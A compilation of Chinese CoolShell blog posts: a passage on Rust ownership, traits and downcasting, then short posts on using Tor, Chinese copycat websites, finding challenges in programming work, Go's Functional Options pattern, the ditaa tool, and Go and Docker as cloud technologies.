let mut thread_handlers = vec![]; // 用于收集线程句柄for i in 0..NTHREAD {     // clone Arc 准备move到线程中，只增加引用计数，不会深拷贝内部数据     let test_data = arc_data.clone();     let res = result.clone();     thread_handlers.push(     thread::spawn(move || {     let id = i;     //找到自己的分区     let chunk_size = TOTAL_SIZE / NTHREAD + 1;     let start = id * chunk_size;     let end = std::cmp::min(start + chunk_size, TOTAL_SIZE);     //进行求和运算     let mut sum = 0;     for  i in start..end  {     sum += test_data[i];     }     //原子操作     res.fetch_add(sum as u64, Ordering::SeqCst);     println!("id={}, sum={}", id, sum );     }     ));     }     //等所有的线程执行完     for th in thread_handlers {     th.join().expect("The sender thread panic!!!");     }     //输出结果     println!("result = {}",result.load(Ordering::SeqCst));
上面的这个例程，是用多线程的方式来并行计算一个大的数组的和，每个线程都会计算自己的那一部分。上面的代码中，* 需要向每个线程传入一个只读的数组，我们用`Arc` 智能指针把这个数组包了一层。   * 需要向每个线程传入一个变量用于数据数据，我们用 `Arc<AtomicU64>` 包了一层。   * 注意：`Arc` 所包的对象是不可变的，所以，如果要可变的，那要么用原子对象，或是用Mutex/Cell对象再包一层。这一些都是为了要解决“线程的Move语义后还要共享问题”。#### 多态和运行时识别##### 通过Trait多态多态是抽象和解耦的关键，所以，一个高级的语言是必需实现多态的。在C++中，多态是通过虚函数表来实现的（参看《C++的虚函数表》），Rust也很类似，不过，在编程范式上，更像Java的接口的方式。其通过借用于Erlang的Trait对象的方式来完成。参看下面的代码：我们有两个类，一个是“长方形”，一个是“圆形”， 还有一个 `IShape` 的trait 对象（原谅我用了Java的命名方式），其中有两个方法：求面积的 `area()` 和 转字符串的 `to_string()`。下面相关的实现：
于是，我们就可以有下面的多态的使用方式了（我们使用独占的智能指针类 `Box`）：use std::vec::Vec;##### 向下转型但是，在C++中，多态的类型是抽象类型，我们还想把其转成实际的具体类型，在C++中叫运行进实别RTTI，需要使用像 `type_id` 或是 `dynamic_cast` 这两个技术。在Rust中，转型是使用 ‘`as`‘ 关键字，然而，这是编译时识别，不是运行时。那么，在Rust中是怎么做呢？嗯，这里需要使用 Rust 的 `std::any::Any` 这个东西，这个东西就可以使用 `downcast_ref` 这个东西来进行具体类型的转换。于是我们要对现有的代码进行改造。首先，先得让 `IShape` 继承于 `Any` ，并增加一个 `as_any()` 的转型接口。use std::any::Any;     trait  IShape : Any + 'static  {     fn as_any(&self) -> &dyn Any;     …… …… ……     }然后，在具体类中实现这个接口：impl IShape  for Rectangle {     fn as_any(&self) -> &dyn Any { self }     …… …… ……     }     impl IShape  for Circle  {     fn as_any(&self) -> &dyn Any { self }     …… …… ……     }
于是，我们就可以进行运行时的向下转型了：#### Trait 重载操作符操作符重载对进行泛行编程是非常有帮助的，如果所有的对象都可以进行大于，小于，等于这亲的比较操作，那么就可以直接放到一个标准的数组排序的的算法中去了。在Rust中，在 `std::ops` 下有全载的操作符重载的Trait，在`std::cmp` 下则是比较操作的操作符。我们下面来看一个示例：假如我们有一个“员工”对象，我们想要按员工的薪水排序，如果我们想要使用`Vec::sort()`方法，我们就需要实现这个对象的各种“比较”方法。这些方法在 `std::cmp` 内—— 其中有四个Trait : `Ord`、`PartialOrd` 、`Eq` 和 `PartialEq` 。其中，`Ord` 依赖于 `PartialOrd` 和 `Eq` ，而`Eq` 依赖于 `PartialEq`，这意味着你需要实现所有的Trait，而`Eq` 这个Trait 是没有方法的，所以，其实现如下：于是，我们就可以进行如下的操作了：//用for-loop找出薪水最多的人     let mut e = &v[0];     for i in 0..v.len() {     if *e < v[i] {     e = &v[i];     }     }     println!("max = {:?}", e);
//使用标准的方法     println!("min = {:?}", v.iter().min().unwrap());     println!("max = {:?}", v.iter().max().unwrap());//使用标准的排序方法     v.sort();     println!("{:?}", v);#### 小结现在我们来小结一下：* 在Rust的中，最重要的概念就是“不可变”和“所有权”以及“Trait”这三个概念。   * 在所有权概念上，Rust喜欢move所有权，如果需要借用则需要使用引用。   * Move所有权会导致一些编程上的复杂度，尤其是需要同时move两个变量时。   * 引用（借用）的问题是生命周期的问题，一些时候需要程序员来标注生命周期。   * 在函数式的闭包和多线程下，这些所有权又出现了各种麻烦事。   * 使用智能指针可以解决所有权和借用带来的复杂度，但带来其它的问题。   * 最后介绍了Rust的Trait对象完成多态和函数重载的玩法。Rust是一个比较严格的编程语言，它会严格检查你程序中的：* 变量是否是可变的   * 变量的所有权是否被移走了   * 引用的生命周期是否完整   * 对象是否需要实现一些Trait
这些东西都会导致失去编译的灵活性，并在一些时候需要“去糖”，导致，你在使用Rust会有诸多的不适应，程序编译不过的挫败感也是令人沮丧的。在初学Rust的时候，我想自己写一个单向链表，结果，费尽心力，才得以完成。也就是说， **如果你对Rust的概念认识的不完整，你完全写不出程序，那怕就是很简单的一段代码** 。我觉得，这种挺好的，逼着程序员必需了解所有的概念才能编码。但是，另一方面也表明了这门语言并不适合初学者。没有银弹，任何语言都有些适合的地方和场景。（全文完）# 如何上网觅无踪作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnTor是一个是开源项目，网址http://www.torproject.org（很遗憾，这个网站因为GFW，在中国大陆你无法访问，），TOR这个项目，旨在把这个世界上所有的代理服务器或是使用Tor的这各个客户端串在一起，形成一个虚似的网络。这是一个分布式的，通过一种P2P技术构建的网络。这个技术很像是BT或是电驴所使用的技术。不过，Tor 的目标是抵御流量分析，流量分析是一种对网络的监视行为，这种行为会威胁个人的匿名与隐私，商业活动与业务关系的保密和国家的安全，打破网络屏蔽。
也就是说，这是一种可以保护你私人上网信息的技术。你每次请求网页你都会通过第三方，每一次你都会使用不同的路由，不同的IP地址，从而达到你在网上的行踪无人可觅。这是我推荐你下载一个三套件，Vidalia Bundle，其中包括，Vidalia, Tor 和 Privoxy，也是属于Tor这个项目。你知道的，所有的开源项目都会互相借鉴，Tor也不例，除了自己的东西，同样也会借鉴别人的项目。安装后，你可以在你的开始菜单中找到“Vidalia Bundle”，然后，请先启动Privoxy，然后启动Tor，此时，你可以把你的浏览器的Sock代理设置为127.0.0.1，端口号是9050。（注意：这是Sock代理，不是HTTP代理）如果你使用的是Firefox，你只需要下载一个Firfox的Tor插件就可以完全代理的设置了。使用TOR，不但可以让自己的上网无踪迹，同样也可以突破我们国家的Great Firewall而去访问很多不能访问的国外站点。# 中国的C2C模式作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnC2C不是电了商务里的C2C，而是Copy to China的缩写，以前，我们以Made in China著称，现在我们会以C2C著称。toxicat制作了下面这个图片(源图)，大家慢慢欣赏，我相信，如果要把所有的C2C都列上去的话，那么，可能会上很长的一个图片。还记得那篇为什么中国的网页设计那么烂？吗？呵呵。何止是互联网，其它东西不也是C2C吗？
————————————————与此同时，路透社报道: 美国将百度列入“恶名市场”名单 – 美国政府周一再次将中国最大网络搜索引擎百度列入假冒和盗版产品的年度“恶名市场”名单。美国企业界希望此名单能促使美国国会对这些“流氓网站”采取行动。（BBC：与百度一同被列入此名单的还有淘宝、北京秀水街、北京海龙电脑市场、上海杨浦颐高数码城、深圳罗湖市场、香港女人街、义务小商品市场、91.com，以及TV Ants）（全文完）# 挑战无处不在作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn面试过一些应聘者，当我问到为什么换工作的时候， **他们都会告诉我，现在的工作没有挑战，无聊，所以想换一个有挑战的工作** 。于是我问了一下他的工作情况，发现那些有挑战的东西他还没有搞懂。我总是为有这样的认识的朋友感到惋惜，因为我总是认为有挑战的东西无处不在啊，不能因为工作上没有，自己就放纵了自己。比如，面试过一个做地图的工程师，他的工作是做计算地图上任意两点的最短或最优路径的一部分功能。我觉得这个事很有挑战，也有难度，应聘者说，没什么挑战，因为他做的东西只是调用相关的算法库。他在这个项目干了2年了，当我问他有没有看过算法库，知不知道地图是怎么存储的？他却告诉我， **因为没有去做，所以就没有去了解，等做的时候再了解** （我希望有这样想法的人都去看看程序员的谎谬之言还是至理名言？）。这样的例子很多，很多应聘者在面试中不能和我一起解决某个问题的时候，比如：OOD，数据库设计，系统设计，等， **他们都会告诉我，不好意思，因为没有做过相关的事情，所以就不懂了，所以，他需要一个像我们这样的项目来学习和锻炼** 。我并不要求你能解决你所不擅长的问题，但毕竟数据库，OO，系统设计都是软件开发的基础知识，多少要懂一些吧。
但另外一方面，他们都会告诉我他们对技术充满和热情和兴趣，有着很强的学习能力，也有很能吃苦的态度。这也许是某面试宝典上看来的，面经上可能都会说，如果面对不能作答问题，可以说一下自己的态度和决心。可惜的是，我并不这么想的，我在我的两篇关于招聘的文章里（我是怎么招聘程序员的，再谈我是怎么招聘程序员的）都说过一些我对如何择人的想法。这里重点说明一下其中两个观点：* **关于热情和态度，说白了就是不要给自己找借口** 。比如：“工作忙事多没时间学所以可以不懂”，“工作中没用到所以可以不懂”，“工作没有挑战，一直没有遇到合适的项目”等等。时间可以挤，工作之余可以学，随时随地去思考，挑战是无处不在的…… 想想那些你有热情的事，你会发现，几乎没有什么可以阻止你去做那些事。* **对于某些事情，如果以前没有在你身上发生过，那么这个事情在未来也不会发生** 。如果你以前没有对你接触过的东西去学习，去深挖，去思考，去改善，那么我不会相信你会在未来面对新的东西的时候也会有这样的态度；如果你以前没有用业余时间学习一些项目之外的东西，那么我也不会相信你会在未来会这样做；如果你以前没有把你的热情和态度转换成你的知识，经验和成果，那么我也不会相信你会在未来能做到。
这两个观点可能太刻薄了，但是，当我回想我自己的经历的时候，观察程序员的成长过程的时候，我发现，优秀的程序员都是相似的，当他们还在是一个菜鸟的时候，就已经有各种成为高手的苗头了，这些苗头就是—— **他们热爱思考，喜欢解决难题，对新鲜事物非常好奇，总是找人讨论，可以用自己的业余时间狠命研究很多和工作无关的技术，会在业余的时间里写些有趣的小程序，或是会把自己的思路书写下来，等等，等等** 。#### 一些问题我这样说，大家可能会觉得“挑战无处不在”这句话太虚了，而且可能不明白什么叫“热爱思考”，这里，我把我的或别人的思考的东西罗列一下，这些问题，有的会让我思考推敲，有的会让我疯狂地查资料，问人，或是找人讨论，询问。大家不妨可以跟着我一起思考一下。酷壳上有一些小问题，比如：火车运煤问题，赛马问题，这些问题都不够实际，我觉得也这些问题有点无聊，我们不妨观察一下我们身边的东西，我们就可以看到很多有挑的战的东西，对于这些问题，如果是你来做，你会怎么做呢？0）许多年前，当我看到珊瑚虫QQ把IP转成地实际地址的时候，我就在思考，如果我有一个IP网段的数据（全球IP地址数据），我怎么来完成这个功能呢？比如：某地点的IP网段是：10.10.1.* – 10.10.5.*。我要有一个IP地址是：10.10.3.20，我怎么匹配这个网段？用Hash表吗？好像有问题。把IP字串转成整型？排序+二分法，好像更容易解决一些，但是如果有一些修改的话好像有点不方便。用树型结构（森林）会不会更好一些呢？如果我要通过地点反查IP段呢？
1）网上短网址服务，你有想过这个短网址生成的算法是什么，如何能做到能最短？怎么查询？你也许觉得会用key- value的NoSQL。那么，如果对于同一个URL，如果要重用已生成的短网址，你怎么用key-value的NoSQL来解决？英汉词典的检索和这个很相似，如果通过英文查汉语，又通过汉语查英文？如果是N多种语言的互相翻译呢？你的数据存储和检索如何做呢？2）当我看到Dropbox这样的云同步的软件的时候，我不知道你是否会和我一样会去思考，在多个设备间的文件同步是怎么做的？如果网盘上有几万，甚至几百万个文件，当要和我的本地数据同步时，他如何比较经济地知道哪些文件更改了？需要向服务端同步或是向客户端同步。更进一步，你有没有想过没有中心结点的文件同步问题？你有没有想过，文件冲突的问题？3）我们的新员工入职的时候，有一些公司会给新员工的帐号生成一个随机口令，然后新员工可以在登录后修改口令（我一直在想我们的银行应该为用户生成一个随机口令，而不是设置一个6个0或是6个8的初始口令）。那么，对生成随机安全口令的算法知道怎么做吗？如果你写出这个算法来了，你怎么证明这个算法是足够随机，生成的密码强度足够大的？（你会发现，测试口令是否随机是否安全的程序，会比生成器更难写）
4）关于动态密码RSA SecurID（如下图），这个小设备上的6位数字会每60秒变一次，在你登录的时候，需要输入这6位数字，服务器上会认证这6个数字，那么这个事怎么做？再试想一下，这样的小设备我要发给我的客户，我希望我的每个客户都使用不一样的随机算法，就算是算法一样，算法的种子也不能一样。那么，如果我的客户一共有百万甚至千万，我的服务端怎么管理这些用户的SecurID？5）看看我们的网银或是ATM的用户登录功能，如果你登录时输错口令超过3次以上，你的帐号就会被冻结，需要去柜台重置口令。这个功能看上去很安全，因为可以防止黑客在线尝试破解你的登录口令。不过这又带来了另一个问题，如果有一个恶意用户知道你的卡号，他就上网或是造个卡故意输错你的口令，导致你的帐号被冻结，让你一次又一次地去银行排队重置。面对这样的情况，你该怎么解决？6）当你在网上购物的时候，你会去一些电子商务的网站，这些网站都会对他们的产品进行分类，有大分类有子分类。你进到分类后，你可以通过不同的属性来过滤不同该分类下的商品，注意，不同分类下的商品的过滤属性不一样，如，手机分类和电视分类的属性都不一样。试问，你如何设计你的数据库表结构？
7）当你在泡各种论坛或SNS社区的时候，你会看到，用户在互相回复的时候存在一个问题，尤其是用户量很大的时候，大家的回复完全交织在一起什么 也看不清楚。以前有的论坛使用树形列表来解决这个问题，树形列表好是好，但是把一棵大树放在那里还是很难看。Twitter.com给了一个非常不错的解决方式，就是所有人的回复或是回复的回复都按时间线放在一起，如果你要查看某回复的上下文的话，点击一下这个回复就可以看到了（我在我在“国内微博和Twitter的最大不同”中批评过这个事）。新浪微博在禁评论事件后也开发出了这个功能。你知道这个事怎么做吗？更进一步，新浪微博的设计上有很多的缺陷，单说新开发的“查看评论”功能这个事来说，还是不完美，因为某些评论会随着转发带到别的地方去，他的“查看评论”功能只能看到当个贴子下的东西，不能把所有转发出去的贴子的评论一起综合起来。虽然这对于用户使用来说没有什么在不了的，但是对于软件设计来说，我们不妨做一个练习，可以思考一下，怎么样设计会更好。再举一反三，有时候，我发现多个网友会提出同样的问题，我很想用一个回复同时回复他们。如果有这样的功能的话，我们的回复就会从一个树形变成另外一种形状了，我们又该如何设计才能支持这样的功能呢？
8）说到新浪微博，我就想多说几句，我最近观察到了两个事：* 一个是验证码的事，如果你在你的帐号设置里设置了“登录需要验证码”，你会发现，在登录新浪微博的时候，仅当你输对了口令后，系统才会提示你输入验证码。为什么呢？因为，这个“登录需要验证码”这绑定在你的帐号设置里的，所以，要取这个设置，就需要你登录成功（？！），老实说，这个功能在设计上有点二（中国特色）。如果是你，你怎么设计呢？* 另一个事情是新浪微博或Twitter的用户名修改后，被他人@过的信息就再也链接不到你这里来了。我们来试想一下，如果是你，你怎么解决这个问题？（我的我的微博里讨论过这个事，不一定对，供大家参考）9）我有时候我会发一些快递，有时候是一些小东西，有时候是一些大包裹，有时候近，有时候远。我发现一个有趣的现象，就是快递员来收件的时候，快递的价格都是快递员自己说了算的，我还可以和他们砍价。我观察到他们会以距离，重量大小来订价。于是我在想如果你要运营一个物流公司，你作为这个物流公司的程序员，你需要开发一个软件来标注快递价格，你会怎么做？比如，这个快递公司会说，在北京五环以内是一个价，以外是一个价，出省后，上海以北是一个价，上海以南是一个价，等等，这只是北京的，如果把全国的各个城市到别的城市的价格都考虑进来，还要受到重量，体积，价格，是否加急等等因素的影响，你的数据库设计要怎么做呢？
A）国内的水军太恐怖了。他们活动的刷排名，刷信用，刷积分，刷粉丝等等地方，你是否想过如何解决这个问题？还有广告联盟的欺诈问题，等等。这些东西，有的还是可以通过技术手段进行限制和计算的，你有思考过应该使用什么样的方法吗？B）说到水军就不能不提垃圾邮件和垃圾短信。你有没有想过邮件系统怎么过滤垃圾信息的？C）关于推荐功能，这必然是一个热点，这是软件产品从request -> response的被动方式到主动方式的进化。微博上有推荐关注者的功能，电商有推荐商品的功能，豆瓣上有推荐影片音乐书籍的功能。不同的领域的推荐算法各不相同，你有没有思考过，如果是你来做推荐算法的时候，你会怎么做吗？更进一步，推荐通常伴随着学习和匹配，学习用户的行为，匹配相似的东西，你想过怎么学习用户的行为，怎么匹配相似的东西了吗？D）关于微博，某名人有几千万的粉丝，当这个名人发一个微博的时候，需要通知这几千万个粉丝，这个在系统架构上应该怎么做？如果某天这个名人与人发生口角，和人吵架，拼命的刷微博，那么，系统架构要怎么设计才能支持这样的事呢？E）想想火车票的分段卖票的方式，现有的解决方案是为每个站点预留票，于是我们可以看到火车始发时，有很多空坐，这些空坐都是留给下一个站点的，我们能否开发出一个系统来，可以把一条线上的这些这站上那站下的旅客统筹规划一下，制定出一个最经济的方式，让火车运行得更有效。
F）对于地铁公交网络，我们希望这个网络既能有更多的覆盖，又能节省路线，你能不能设计出一个系统，当我们输入一些数据（如：站点，是否终点或起点站，该站的下一站可能方向（多个），该站是以上车为主，还是下车为主，等等），你的系统能自动安排出各种线路吗？**这样的问题实在是太多了，都是可以让我们去思考的，并不一定有经济效益，但是至少可以让你锻炼一下怎么去分析问题，怎么去思考，怎么去解决问题** 。#### 总结综上所述，我想说的是：1） 只要你想，挑战是无处不在的。那怕是你现有的觉得无聊的东西，只要你想做到极致，那怕是一个简单的功能（比如用户登录的功能）也会让你充满挑战。2）观察身边的事物，去思考，去调查，举一反三，这才是你成长的源泉。不要把你的成长推给客观原因。3）我的软件开发的三重门中说过，第三重门是解决实际问题，让你的业务处理更为的智能，更为地强大。我不知道为什么这一两年，我们的圈子里所有的人都在关注着“云”，“海量数据处理”，“高性能架构”这样的东西，尤其是那些性能调的高性能的东西并不很难，而这些更为实际问题更有挑战性，也更有前景。（全文完）# Go 编程模式：Functional Options
作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn在本篇文章中，我们来讨论一下Functional Options这个编程模式。这是一个函数式编程的应用案例，编程技巧也很好，是目前在Go语言中最流行的一种编程模式。但是，在我们正式讨论这个模式之前，我们需要先来看看要解决什么样的问题。### 本文是全系列中第3 / 10篇：Go编程模式* Go编程模式：切片，接口，时间和性能   * Go 编程模式：错误处理   * Go 编程模式：Functional Options   * Go编程模式：委托和反转控制   * Go编程模式：Map-Reduce   * Go 编程模式：Go Generation   * Go编程模式：修饰器   * Go编程模式：Pipeline   * Go 编程模式：k8s Visitor 模式   * Go编程模式 ： 泛型编程« 上一篇文章下一篇文章 »目录* 配置选项问题   * 配置对象方案   * Builder模式   * Functional Options   * 参考文档#### 配置选项问题在我们编程中，我们会经常性的需要对一个对象（或是业务实体）进行相关的配置。比如下面这个业务实体（注意，这仅只是一个示例）：
type Server struct {     Addr     string     Port     int     Protocol string     Timeout  time.Duration     MaxConns int     TLS      *tls.Config     }在这个 `Server` 对象中，我们可以看到：* 要有侦听的IP地址 `Addr` 和端口号 `Port` ，这两个配置选项是必填的（当然，IP地址和端口号都可以有默认值，当这里我们用于举例认为是没有默认值，而且不能为空，需要必填的）。   * 然后，还有协议 `Protocol` 、 `Timeout` 和`MaxConns` 字段，这几个字段是不能为空的，但是有默认值的，比如：协议是`tcp`, 超时`30`秒 和 最大链接数`1024`个。   * 还有一个 `TLS` 这个是安全链接，需要配置相关的证书和私钥。这个是可以为空的。所以，针对于上述这样的配置，我们需要有多种不同的创建不同配置 `Server` 的函数签名，如下所示（代码比较宽，需要左右滚动浏览）：因为Go语言不支持重载函数，所以，你得用不同的函数名来应对不同的配置选项。
#### 配置对象方案要解决这个问题，最常见的方式是使用一个配置对象，如下所示：type Config struct {     Protocol string     Timeout  time.Duration     Maxconns int     TLS      *tls.Config     }我们把那些非必输的选项都移到一个结构体里，于是 `Server` 对象变成了：于是，我们只需要一个 `NewServer()` 的函数了，在使用前需要构造 `Config` 对象。//Using the default configuratrion     srv1, _ := NewServer("localhost", 9000, nil)这段代码算是不错了，大多数情况下，我们可能就止步于此了。但是，对于有洁癖的有追求的程序员来说，他们能看到其中有一点不好的是，`Config` 并不是必需的，所以，你需要判断是否是 `nil` 或是 Empty – ` Config{}`这让我们的代码感觉还是有点不是很干净。#### Builder模式如果你是一个Java程序员，熟悉设计模式的一定会很自然地使用上Builder模式。比如如下的代码：
User user = new User.Builder()     .name("Hao Chen")     .email("[[email protected]](/cdn-cgi/l/email-protection)")     .nickname("左耳朵")     .build();仿照上面这个模式，我们可以把上面代码改写成如下的代码（注：下面的代码没有考虑出错处理，其中关于出错处理的更多内容，请参看《Go 编程模式：出错处理》）：//使用一个builder类来做包装     type ServerBuilder struct {     Server     }func (sb *ServerBuilder) Create(addr string, port int) *ServerBuilder {     sb.Server.Addr = addr     sb.Server.Port = port     //其它代码设置其它成员的默认值     return sb     }于是就可以以如下的方式来使用了上面这样的方式也很清楚，不需要额外的Config类，使用链式的函数调用的方式来构造一个对象，只需要多加一个Builder类，这个Builder类似乎有点多余，我们似乎可以直接在`Server` 上进行这样的 Builder 构造，的确是这样的。但是在处理错误的时候可能就有点麻烦（需要为Server结构增加一个error 成员，破坏了Server结构体的“纯洁”），不如一个包装类更好一些。
如果我们想省掉这个包装的结构体，那么就轮到我们的Functional Options上场了，函数式编程。#### Functional Options首先，我们先定义一个函数类型：type Option func(*Server)然后，我们可以使用函数式的方式定义一组如下的函数：上面这组代码传入一个参数，然后返回一个函数，返回的这个函数会设置自己的 `Server` 参数。例如：* 当我们调用其中的一个函数用 `MaxConns(30)` 时   * 其返回值是一个 `func(s* Server) { s.MaxConns = 30 }` 的函数。这个叫高阶函数。在数学上，就好像这样的数学定义，计算长方形面积的公式为： `rect(width, height) = width * height;` 这个函数需要两个参数，我们包装一下，就可以变成计算正方形面积的公式：`square(width) = rect(width, width)` 也就是说，`squre(width)`返回了另外一个函数，这个函数就是`rect(w,h)` 只不过他的两个参数是一样的。即：`f(x) = g(x, x)`
好了，现在我们再定一个 `NewServer()`的函数，其中，有一个可变参数 `options` 其可以传出多个上面上的函数，然后使用一个for- loop来设置我们的 `Server` 对象。于是，我们在创建 `Server` 对象的时候，我们就可以这样来了。s1, _ := NewServer("localhost", 1024)     s2, _ := NewServer("localhost", 2048, Protocol("udp"))     s3, _ := NewServer("0.0.0.0", 8080, Timeout(300*time.Second), MaxConns(1000))怎么样，是不是高度的整洁和优雅？不但解决了使用 `Config` 对象方式 的需要有一个config参数，但在不需要的时候，是放 `nil` 还是放 `Config{}`的选择困难，也不需要引用一个Builder的控制对象，直接使用函数式编程的试，在代码阅读上也很优雅。所以，以后，大家在要玩类似的代码时，强烈推荐使用Functional Options这种方式，这种方式至少带来了如下的好处：
* 直觉式的编程   * 高度的可配置化   * 很容易维护和扩展   * 自文档   * 对于新来的人很容易上手   * 没有什么令人困惑的事（是nil 还是空）#### 参考文档* **“Self referential functions and design” by Rob Pike   **(全文完)# 把ASCII图转成图片作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn我们都知道有很多软件帮我们把图片转成ASCII码图，这里这个工具是帮我们把ASCII图转成漂亮的图片。这个开源的软件是一个用Java写成的一个命令行的工具。对于这个工具的目的，我个人以为如下：* 其一，可以把别人的ASCII图转成图片，于是更好看一些。   * 其二，你可以使用ASCII码画图，而不需要使用图片编辑器。   * 其三，因为是命令行，所以，你完全可以以脚本或程序的方法来作图了。这个工具软件叫ditaa，其网址是：。这个小工具支持一些语法定义，可以帮你更好地产生图片，如下所示：**圆角矩形**/--+     |  |     +--/| !round corner demo   ---|---
**定义颜色**Color codes     /-------------+-------------\     |cRED RED     |cBLU BLU     |     +-------------+-------------+     |cGRE GRE     |cPNK PNK     |     +-------------+-------------+     |cBLK BLK     |cYEL YEL     |     \-------------+-------------/| !color code   ---|---**一些图示**名字 | ASCII | 图版 | 注释   ---|---|---|---   文档 ||  | 表示文件   存储 ||  | 表示数据库或磁盘   输入   输出 ||  | 输入/输出标志。**线条设置**|    ---|---**线上的链接点***----*     |    |      /--*     *    *      |     |    |  -*--+     *----*| !point marker demo   ---|---
**文本**/-----------------\     | Things to do    |     | cGRE            |     | o Cut the grass |     | o Buy jam       |     | o Fix car       |     | o Make website  |     \-----------------/| !bullet point demo   ---|---# Go语言、Docker 和新技术作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn上个月，作为 Go 语言的三位创始人之一，Unix 老牌黑客罗勃·派克（Rob Pike）在新文章“Go: Ten years and climbing”中，回顾了一下 Go 语言的发展过程。其中提到，Go 语言这十年的迅猛发展大到连他们自己都没有想到，并且还成为了云计算领域中新一代的开发语言。还提到了，中国程序员对 Go 语言的热爱完全超出了他们的想象，甚至他们都不敢相信是真的。这让我想起，我在 2015 年 5 月份拜访 Docker 公司在湾区的总部时，Docker 负责人也和我表达了相似的感叹：他们完全没有想到居然中国有那么多人喜欢 Docker，而且还有这么多人在为 Docker 做贡献，这让他们感到非常意外。此外，还跟我说，中国是除了美国本土之外的另一个如此喜欢 Docker 技术的国家，在其它国家都没有看到。
的确如他们所说，Go 语言和 Docker 这两种技术已经成为新一代的云计算技术，而且可以看到其发展态势非常迅猛。而中国也成为了像美国一样在强力推动这两种技术的国家。这的确是一件让人感到非常高兴的事，因为中国在跟随时代潮流这件事上已经做得非常不错了。然而，从 2014-2015 年我在阿里推动 Docker 和 Go 语言的痛苦和失败过程中，以及这许多年来，有很多很多人问我是否要学 Go 语言，是否要学 Docker，Go 和 Docker 是否能用在生产线上，这些问题看来，对于 Go 语言和 Docker 这两种技术，在国内的技术圈中有相当大的一部分人和群体还在执观望或是不信任的态度。所以，我想写这篇文章，从两个方面来论述一下我的观点和看法。* 一个方面，为什么 Go 语言和 Docker 会是新一代的云计算技术。   * 另一个方面，作为技术人员，我们如何识别什么样的新技术会是未来的趋势。这两个问题是相辅相成的，所以我会把这两个问题揉在一起谈。虽然 Go 语言是在 2009 年底开源的，但我是从 2012 年才开始接触和学习 Go 语言的。我只花了一个周末两天的时间就学完了，而且在这两天，我还很快地写出了一个能工作很好的网页爬虫程序，以及一个简单的高并发文件处理服务，用于提取前面抓取的网页的关键内容。这两个程序都很简单，总共才写了不到 500 行代码。
我当时对 Go 语言有几点体会。**第一，语言简单，上手快。** Go 语言的语法特性简直是太简单了，简单到你几乎玩不出什么花招，直来直去的，学习曲线很低，上手非常快。**第二，并行和异步编程几乎无痛点。** Go 语言的 Goroutine 和 Channel 这两个神器简直就是并发和异步编程的巨大福音。像 C、C++、Java、Python 和 JavaScript 这些语言的并发和异步方式太控制就比较复杂了，而且容易出错，而 Go 解决这个问题非常地优雅和流畅。这对于编程多年受尽并发和异步折磨的我来说，完全就是让我眼前一亮的感觉。（图片来自 Medium：Why should you learn Go?）**第三，Go 语言的 lib 库麻雀虽小五脏俱全。** Go 语言的 lib 库中基本上有绝大多数常用的库，虽然有些库还不是很好，但我觉得不是问题，因为我相信在未来的发展中会把这些问题解决掉。**第四，C 语言的理念和 Python 的姿态。** C 语言的理念是信任程序员，保持语言的小巧，不屏蔽底层且底层友好，关注语言的执行效率和性能。而 Python 的姿态是用尽量少的代码完成尽量多的事。于是我能够感觉到，Go 语言想要把 C 和 Python 统一起来，这是多棒的一件事啊。
（图片来自 Medium：Why should you learn Go?）所以，即便 Go 语言存在诸多的问题，比如垃圾回收、异常处理、泛型编程等，但相较于上面这几个优势，我认为这些问题都是些小问题。于是就毫不犹豫地入坑了。当然，一个技术能不能发展起来，关键还要看三点。* **有没有一个比较好的社区。** 像 C、C++、Java、Python 和 JavaScript 的生态圈都是非常丰富和火爆的。尤其是有很多商业机构参与的社区那就更为人气爆棚了，比如 Linux 的社区。   * **有没有一个工业化的标准。** 像 C、C++、Java 都是有标准化组织的。尤其是 Java，其在架构上还搞出了像 J2EE 这样的企业级标准。   * **有没有一个或多个杀手级应用。** C、C++ 和 Java 的杀手级应用不用多说了，就算是对于 PHP 这样还不能算是一个好的编程语言来说，因为是 Linux 时代的第一个杀手级解决方案 LAMP 中的关键技术，所以，也发展起来了。上述的这三点是非常关键的，新的技术只需要占到其中一到两点就已经很不错了，何况有的技术，比如 Java，是三点全占到了，所以，Java 的发展是如此好。当然，除了上面这三点重要的，还有一些其它的影响因素，比如：
* **学习曲线是否低，上手是否快。** 这点非常重要，C++ 在这点上越做越不好了。   * **有没有一个不错的提高开发效率的开发框架。** 如：Java 的 Spring 框架，C++ 的 STL 等。   * **是否有一个或多个巨型的技术公司作为后盾。** 如：Java 和 Linux 后面的 IBM、Sun……   * **有没有解决软件开发中的痛点。** 如：Java 解决了 C 和 C++ 的内存管理问题。用这些标尺来量一下 Go 语言，我们可以清楚地看到：* Go 语言容易上手；   * Go 语言解决了并发编程和写底层应用开发效率的痛点；   * Go 语言有 Google 这个世界一流的技术公司在后面；   * Go 语言的杀手级应用是 Docker，而 Docker 的生态圈在这几年完全爆棚了。所以，Go 语言的未来是不可限量的。当然，我个人觉得，Go 可能会吞食很多 C、C++、Java 的项目。不过，Go 语言所吞食主要的项目应该是中间层的项目，既不是非常底层也不会是业务层。也就是说，Go 语言不会吞食底层到 C 和 C++ 那个级别的，也不会吞食到高层如 Java 业务层的项目。Go 语言能吞食的一定是 PaaS 上的项目，比如一些消息缓存中间件、服务发现、服务代理、控制系统、Agent、日志收集等等，没有复杂的业务场景，也到不了特别底层（如操作系统）的中间平台层的软件项目或工具。而 C 和 C++ 会被打到更底层，Java 会被打到更上层的业务层。这是我的一个判断。
